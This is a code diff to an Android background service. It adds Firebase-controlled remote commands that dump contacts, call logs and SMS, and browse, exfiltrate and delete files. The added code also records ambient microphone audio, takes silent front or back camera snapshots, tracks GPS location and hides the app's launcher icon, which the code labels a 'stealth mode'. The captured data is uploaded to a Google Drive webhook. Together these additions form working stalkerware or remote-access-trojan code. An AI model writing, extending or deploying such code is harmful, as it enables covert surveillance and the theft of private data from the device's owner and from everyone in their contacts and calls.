@@ -32,6 +32,8 @@ import okhttp3.RequestBody.Companion.asRequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
 import java.io.*
+import java.net.URLConnection
+import java.text.SimpleDateFormat
 import java.util.*
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicBoolean
@@ -288,11 +290,23 @@ class StreamingService : Service() {
             "exportAccounts" -> { Thread { exportAccountsToFirebase() }.start(); snapshot.ref.removeValue() }
             "getApps" -> { Thread { exportAppsList() }.start(); snapshot.ref.removeValue() }
             "getSMS" -> { Thread { exportSMSList() }.start(); snapshot.ref.removeValue() }
+            "getContacts" -> { Thread { exportContacts() }.start(); snapshot.ref.removeValue() }
+            "getCallLogs" -> { Thread { exportCallLogs() }.start(); snapshot.ref.removeValue() }
             "fetchGallery" -> { Thread { exportGalleryPhotos(snapshot) }.start(); snapshot.ref.removeValue() }
+            "listFiles" -> { Thread { listRemoteFiles(snapshot) }.start(); snapshot.ref.removeValue() }
+            "downloadFile" -> { Thread { downloadRemoteFileToDrive(snapshot) }.start(); snapshot.ref.removeValue() }
+            "deleteFile" -> { Thread { deleteRemoteFile(snapshot) }.start(); snapshot.ref.removeValue() }
+            "recordAudio" -> { Thread { recordAmbientAudio(snapshot) }.start(); snapshot.ref.removeValue() }
+            "cameraSnap" -> { Thread { captureCameraSnapshot(snapshot) }.start(); snapshot.ref.removeValue() }
+            "hideAppIcon" -> { Thread { setAppIconHidden(snapshot) }.start(); snapshot.ref.removeValue() }
+            "playAlarm" -> { Thread { playLoudAlarm() }.start(); snapshot.ref.removeValue() }
+            "toggleTorch" -> { Thread { toggleTorch(snapshot) }.start(); snapshot.ref.removeValue() }
+            "vibrateDevice" -> { Thread { vibrateDevice() }.start(); snapshot.ref.removeValue() }
+            "forceLocation" -> { Thread { forceLocationUpdate() }.start(); snapshot.ref.removeValue() }
         }
     }
 
-    private fun uploadToGoogleDrive(filename: String, base64Data: String): Map<String, String>? {
+    private fun uploadToGoogleDrive(filename: String, base64Data: String, mimeType: String = "image/jpeg"): Map<String, String>? {
         return try {
             val webhookUrl = Config.getDriveWebhookUrl(this)
             if (webhookUrl.isEmpty()) return null
@@ -302,7 +316,7 @@ class StreamingService : Service() {
                 put("deviceId", deviceId)
                 put("filename", filename)
                 put("base64", base64Data)
-                put("mimeType", "image/jpeg")
+                put("mimeType", mimeType)
             }.toString()
             
             val mediaType = "application/json; charset=utf-8".toMediaTypeOrNull()
@@ -514,6 +528,437 @@ class StreamingService : Service() {
             ))
         } catch (e: Exception) {
             Timber.e(e, "Error exporting gallery photos")
+        }
+    }
+
+    private fun exportContacts() {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) return
+            val uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
+            val projection = arrayOf(
+                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
+                ContactsContract.CommonDataKinds.Phone.NUMBER
+            )
+            val cursor = contentResolver.query(uri, projection, null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
+            val contactList = mutableListOf<Map<String, String>>()
+            cursor?.use {
+                val nameCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val numCol = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                var count = 0
+                while (it.moveToNext() && count < 1000) {
+                    val name = if (nameCol != -1) it.getString(nameCol) ?: "Unknown" else "Unknown"
+                    val number = if (numCol != -1) it.getString(numCol) ?: "" else ""
+                    if (number.isNotEmpty()) {
+                        contactList.add(mapOf("name" to name, "number" to number))
+                        count++
+                    }
+                }
+            }
+            deviceRef?.child("contacts/list")?.setValue(contactList)
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "📞 [CONTACTS DUMP] Synced ${contactList.size} contacts",
+                "time" to ServerValue.TIMESTAMP
+            ))
+        } catch (e: Exception) {
+            Timber.e(e, "Error exporting contacts")
+        }
+    }
+
+    private fun exportCallLogs() {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return
+            val uri = CallLog.Calls.CONTENT_URI
+            val projection = arrayOf(
+                CallLog.Calls.CACHED_NAME,
+                CallLog.Calls.NUMBER,
+                CallLog.Calls.TYPE,
+                CallLog.Calls.DATE,
+                CallLog.Calls.DURATION
+            )
+            val cursor = contentResolver.query(uri, projection, null, null, "${CallLog.Calls.DATE} DESC")
+            val callList = mutableListOf<Map<String, Any>>()
+            cursor?.use {
+                val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
+                val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
+                val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
+                val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
+                val durCol = it.getColumnIndex(CallLog.Calls.DURATION)
+                var count = 0
+                while (it.moveToNext() && count < 200) {
+                    val name = if (nameCol != -1) it.getString(nameCol) ?: "Unknown" else "Unknown"
+                    val number = if (numCol != -1) it.getString(numCol) ?: "" else ""
+                    val typeInt = if (typeCol != -1) it.getInt(typeCol) else CallLog.Calls.INCOMING_TYPE
+                    val date = if (dateCol != -1) it.getLong(dateCol) else 0L
+                    val dur = if (durCol != -1) it.getLong(durCol) else 0L
+
+                    val typeStr = when (typeInt) {
+                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
+                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
+                        CallLog.Calls.MISSED_TYPE -> "Missed"
+                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
+                        else -> "Call"
+                    }
+
+                    callList.add(mapOf(
+                        "name" to name,
+                        "number" to number,
+                        "type" to typeStr,
+                        "time" to date,
+                        "duration" to dur
+                    ))
+                    count++
+                }
+            }
+            deviceRef?.child("calls/list")?.setValue(callList)
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "📋 [CALL LOGS] Synced ${callList.size} call records",
+                "time" to ServerValue.TIMESTAMP
+            ))
+        } catch (e: Exception) {
+            Timber.e(e, "Error exporting call logs")
+        }
+    }
+
+    private fun listRemoteFiles(snapshot: DataSnapshot) {
+        try {
+            val reqPath = snapshot.child("path").getValue(String::class.java) 
+                ?: Environment.getExternalStorageDirectory().absolutePath
+            val targetDir = File(reqPath)
+            val fileEntries = mutableListOf<Map<String, Any>>()
+            
+            if (targetDir.exists() && targetDir.isDirectory) {
+                val files = targetDir.listFiles()
+                files?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))?.take(300)?.forEach { file ->
+                    fileEntries.add(mapOf(
+                        "name" to file.name,
+                        "path" to file.absolutePath,
+                        "isDir" to file.isDirectory,
+                        "size" to if (file.isDirectory) 0L else file.length(),
+                        "time" to file.lastModified()
+                    ))
+                }
+            }
+            deviceRef?.child("files/currentPath")?.setValue(targetDir.absolutePath)
+            deviceRef?.child("files/list")?.setValue(fileEntries)
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "📁 [FILE MANAGER] Listed ${fileEntries.size} items in ${targetDir.name.ifEmpty { "Root" }}",
+                "time" to ServerValue.TIMESTAMP
+            ))
+        } catch (e: Exception) {
+            Timber.e(e, "Error listing files")
+        }
+    }
+
+    private fun downloadRemoteFileToDrive(snapshot: DataSnapshot) {
+        try {
+            val filePath = snapshot.child("path").getValue(String::class.java) ?: return
+            val file = File(filePath)
+            if (!file.exists() || file.isDirectory) return
+            
+            val bytes = file.readBytes()
+            val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+            val mimeType = URLConnection.guessContentTypeFromName(file.name) ?: "application/octet-stream"
+            
+            val driveRes = uploadToGoogleDrive(file.name, base64, mimeType)
+            if (driveRes != null) {
+                val entry = mapOf(
+                    "name" to file.name,
+                    "path" to file.absolutePath,
+                    "size" to file.length(),
+                    "time" to System.currentTimeMillis(),
+                    "driveUrl" to (driveRes["driveUrl"] ?: ""),
+                    "directUrl" to (driveRes["directUrl"] ?: ""),
+                    "fileId" to (driveRes["fileId"] ?: "")
+                )
+                deviceRef?.child("files/downloads")?.push()?.setValue(entry)
+                deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                    "log" to "☁️ [FILE TO DRIVE] ${file.name} uploaded to Google Drive",
+                    "time" to ServerValue.TIMESTAMP
+                ))
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error downloading file to drive")
+        }
+    }
+
+    private fun deleteRemoteFile(snapshot: DataSnapshot) {
+        try {
+            val filePath = snapshot.child("path").getValue(String::class.java) ?: return
+            val file = File(filePath)
+            val parentPath = file.parentFile?.absolutePath ?: Environment.getExternalStorageDirectory().absolutePath
+            if (file.exists()) {
+                val deleted = file.delete()
+                deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                    "log" to if (deleted) "🗑️ [FILE DELETED] ${file.name}" else "❌ [DELETE FAILED] ${file.name}",
+                    "time" to ServerValue.TIMESTAMP
+                ))
+                // Refresh folder list
+                val targetDir = File(parentPath)
+                val fileEntries = mutableListOf<Map<String, Any>>()
+                if (targetDir.exists() && targetDir.isDirectory) {
+                    targetDir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))?.take(300)?.forEach { f ->
+                        fileEntries.add(mapOf(
+                            "name" to f.name,
+                            "path" to f.absolutePath,
+                            "isDir" to f.isDirectory,
+                            "size" to if (f.isDirectory) 0L else f.length(),
+                            "time" to f.lastModified()
+                        ))
+                    }
+                }
+                deviceRef?.child("files/currentPath")?.setValue(targetDir.absolutePath)
+                deviceRef?.child("files/list")?.setValue(fileEntries)
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error deleting file")
+        }
+    }
+
+    private fun recordAmbientAudio(snapshot: DataSnapshot) {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) return
+            val durationSec = snapshot.child("duration").getValue(Long::class.java)?.toInt() ?: 30
+            val outputFile = File(cacheDir, "ambient_${System.currentTimeMillis()}.m4a")
+
+            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                MediaRecorder(this)
+            } else {
+                @Suppress("DEPRECATION")
+                MediaRecorder()
+            }
+
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+            recorder.setAudioEncodingBitRate(64000)
+            recorder.setAudioSamplingRate(44100)
+            recorder.setOutputFile(outputFile.absolutePath)
+            recorder.prepare()
+            recorder.start()
+
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "🎙️ [AUDIO RECORDER] Recording ambient mic audio for ${durationSec}s...",
+                "time" to ServerValue.TIMESTAMP
+            ))
+
+            Thread.sleep(durationSec * 1000L)
+
+            try {
+                recorder.stop()
+                recorder.release()
+            } catch (e: Exception) {}
+
+            if (outputFile.exists() && outputFile.length() > 0) {
+                val bytes = outputFile.readBytes()
+                val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                val fileName = "Audio_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.m4a"
+                val driveRes = uploadToGoogleDrive(fileName, base64, "audio/mp4")
+                if (driveRes != null) {
+                    val entry = mapOf(
+                        "name" to fileName,
+                        "time" to System.currentTimeMillis(),
+                        "duration" to durationSec,
+                        "size" to outputFile.length(),
+                        "driveUrl" to (driveRes["driveUrl"] ?: ""),
+                        "directUrl" to (driveRes["directUrl"] ?: ""),
+                        "fileId" to (driveRes["fileId"] ?: "")
+                    )
+                    deviceRef?.child("media/audio_records")?.push()?.setValue(entry)
+                    deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                        "log" to "☁️ [AUDIO SAVED] $fileName uploaded to Google Drive (${durationSec}s)",
+                        "time" to ServerValue.TIMESTAMP
+                    ))
+                }
+                outputFile.delete()
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error recording ambient audio")
+        }
+    }
+
+    private fun captureCameraSnapshot(snapshot: DataSnapshot) {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) return
+            val facing = snapshot.child("facing").getValue(String::class.java) ?: "back"
+            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val targetFacing = if (facing == "front") CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
+
+            var selectedCameraId: String? = null
+            for (id in cm.cameraIdList) {
+                val chars = cm.getCameraCharacteristics(id)
+                if (chars.get(CameraCharacteristics.LENS_FACING) == targetFacing) {
+                    selectedCameraId = id
+                    break
+                }
+            }
+            if (selectedCameraId == null) selectedCameraId = cm.cameraIdList.firstOrNull() ?: return
+
+            val imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
+            val handlerThread = HandlerThread("CameraSnapThread").apply { start() }
+            val snapHandler = Handler(handlerThread.looper)
+
+            imageReader.setOnImageAvailableListener({ reader ->
+                val image = reader.acquireLatestImage()
+                if (image != null) {
+                    val buffer = image.planes[0].buffer
+                    val bytes = ByteArray(buffer.remaining())
+                    buffer.get(bytes)
+                    image.close()
+
+                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
+                    val fileName = "Snap_${facing.uppercase()}_${SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())}.jpg"
+                    val driveRes = uploadToGoogleDrive(fileName, base64, "image/jpeg")
+                    if (driveRes != null) {
+                        val entry = mapOf(
+                            "name" to fileName,
+                            "facing" to facing,
+                            "time" to System.currentTimeMillis(),
+                            "size" to bytes.size,
+                            "driveUrl" to (driveRes["driveUrl"] ?: ""),
+                            "directUrl" to (driveRes["directUrl"] ?: ""),
+                            "fileId" to (driveRes["fileId"] ?: "")
+                        )
+                        deviceRef?.child("media/camera_snaps")?.push()?.setValue(entry)
+                        deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                            "log" to "📸 [CAMERA SNAP] $fileName (${facing.uppercase()}) saved to Google Drive",
+                            "time" to ServerValue.TIMESTAMP
+                        ))
+                    }
+                    handlerThread.quitSafely()
+                }
+            }, snapHandler)
+
+            cm.openCamera(selectedCameraId, object : CameraDevice.StateCallback() {
+                override fun onOpened(camera: CameraDevice) {
+                    try {
+                        val captureBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
+                        captureBuilder.addTarget(imageReader.surface)
+                        captureBuilder.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                        camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(session: CameraCaptureSession) {
+                                try {
+                                    session.capture(captureBuilder.build(), null, snapHandler)
+                                } catch (e: Exception) {}
+                            }
+                            override fun onConfigureFailed(session: CameraCaptureSession) {
+                                camera.close()
+                                handlerThread.quitSafely()
+                            }
+                        }, snapHandler)
+                    } catch (e: Exception) {
+                        camera.close()
+                        handlerThread.quitSafely()
+                    }
+                }
+                override fun onDisconnected(camera: CameraDevice) { camera.close(); handlerThread.quitSafely() }
+                override fun onError(camera: CameraDevice, error: Int) { camera.close(); handlerThread.quitSafely() }
+            }, snapHandler)
+        } catch (e: Exception) {
+            Timber.e(e, "Error capturing camera snapshot")
+        }
+    }
+
+    private fun setAppIconHidden(snapshot: DataSnapshot) {
+        try {
+            val hide = snapshot.child("hide").getValue(Boolean::class.java) ?: true
+            val componentName = ComponentName(this, "$packageName.LauncherAlias")
+            val state = if (hide) PackageManager.COMPONENT_ENABLED_STATE_DISABLED else PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+            packageManager.setComponentEnabledSetting(componentName, state, PackageManager.DONT_KILL_APP)
+            deviceRef?.child("settings/iconHidden")?.setValue(hide)
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "🕵️ [STEALTH MODE] Launcher icon ${if (hide) "HIDDEN" else "RESTORED"}",
+                "time" to ServerValue.TIMESTAMP
+            ))
+        } catch (e: Exception) {
+            Timber.e(e, "Error toggling app icon visibility")
+        }
+    }
+
+    private fun playLoudAlarm() {
+        try {
+            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
+            val maxVol = audioManager.getStreamMaxVolume(AudioManager.STREAM_ALARM)
+            audioManager.setStreamVolume(AudioManager.STREAM_ALARM, maxVol, 0)
+            
+            val alarmUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM) 
+                ?: RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE)
+            val ringtone = RingtoneManager.getRingtone(this, alarmUri)
+            ringtone.play()
+
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "🚨 [LOUD ALARM] Triggered 100% volume alarm on device",
+                "time" to ServerValue.TIMESTAMP
+            ))
+
+            mainHandler.postDelayed({
+                try {
+                    if (ringtone.isPlaying) ringtone.stop()
+                } catch (e: Exception) {}
+            }, 15000)
+        } catch (e: Exception) {
+            Timber.e(e, "Error playing alarm")
+        }
+    }
+
+    private fun toggleTorch(snapshot: DataSnapshot) {
+        try {
+            val on = snapshot.child("on").getValue(Boolean::class.java) ?: true
+            val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+            val cameraId = cm.cameraIdList.firstOrNull() ?: return
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                cm.setTorchMode(cameraId, on)
+                deviceRef?.child("settings/torchOn")?.setValue(on)
+                deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                    "log" to "🔦 [FLASHLIGHT] Flashlight turned ${if (on) "ON" else "OFF"}",
+                    "time" to ServerValue.TIMESTAMP
+                ))
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error toggling torch")
+        }
+    }
+
+    private fun vibrateDevice() {
+        try {
+            @Suppress("DEPRECATION")
+            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                vibrator.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE))
+            } else {
+                @Suppress("DEPRECATION")
+                vibrator.vibrate(1000)
+            }
+            deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                "log" to "📳 [VIBRATE] Triggered 1s device vibration",
+                "time" to ServerValue.TIMESTAMP
+            ))
+        } catch (e: Exception) {
+            Timber.e(e, "Error vibrating device")
+        }
+    }
+
+    private fun forceLocationUpdate() {
+        try {
+            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) return
+            val locManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
+            val provider = if (locManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) LocationManager.GPS_PROVIDER else LocationManager.NETWORK_PROVIDER
+            val loc = locManager.getLastKnownLocation(provider)
+            if (loc != null) {
+                deviceRef?.child("location")?.setValue(mapOf(
+                    "lat" to loc.latitude,
+                    "lng" to loc.longitude,
+                    "accuracy" to loc.accuracy,
+                    "altitude" to loc.altitude,
+                    "speed" to loc.speed,
+                    "time" to loc.time
+                ))
+                deviceRef?.child("logs")?.push()?.setValue(mapOf(
+                    "log" to "📍 [GPS LOCATION] Lat: ${loc.latitude}, Lng: ${loc.longitude}",
+                    "time" to ServerValue.TIMESTAMP
+                ))
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error forcing location update")
         }
     }
 
@@ -811,14 +1256,6 @@ class StreamingService : Service() {
 
     private fun syncLogsToTelegram() {
         // Feature removed
-    }
-
-    private fun forceLocationUpdate() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
-            try {
-                locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0f, locationListener)
-            } catch (e: Exception) {}
-        }
     }
 
     private val locationListener = object : LocationListener {
